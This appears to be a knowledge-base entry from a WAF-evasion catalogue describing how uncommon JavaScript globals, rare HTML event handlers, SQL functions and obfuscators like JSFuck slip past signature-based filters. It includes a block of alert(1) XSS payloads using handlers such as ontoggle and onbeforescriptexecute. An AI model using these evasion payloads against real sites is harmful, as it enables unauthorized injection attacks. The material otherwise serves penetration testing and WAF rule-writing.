---
id: WAF-EVASION-16
title: Atypical Equivalent Syntactic Structures
category: Evasion Techniques
severity_range: Medium-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-16: Atypical Equivalent Syntactic Structures

## Summary

Using overlooked or less-common JavaScript functions, HTML attributes, and SQL operators to bypass WAF signature detection. Most WAFs focus on common attack patterns and miss equivalent but non-standard syntax.

## When to Use

- When standard attack patterns are blocked
- Against WAFs with signature-based detection
- For XSS, SQLi, and other injection types

## Overlooked JavaScript Functions

- `window` - Can replace `self` in some contexts
- `parent` - Access parent window context
- `this` - Reference current scope
- `self` - Reference window self

## Overlooked HTML/Event Attributes

```html
<!-- Uncommon event handlers that bypass signature lists -->
<element onwheel=alert(1)>
<element ontoggle=alert(1)>
<element onfilterchange=alert(1)>
<element onbeforescriptexecute=alert(1)>
<element ondragstart=alert(1)>
<element onauxclick=alert(1)>
<element onpointerover=alert(1)>
<element srcdoc="<img src=x onerror=alert(1)>">
```

## Overlooked SQL Operators

- `lpad()` - Can replace string functions
- `field()` - String position finding
- `bit_count()` - Integer analysis

## JS Obfuscation Engines

- **JSFuck** - Uses only 6 characters: `[]()!+`
- **JJEncode** - Uses only symbols
- **XChars.JS** - Unicode-based encoding

## References

- JSFuck: https://jsfuck.com/
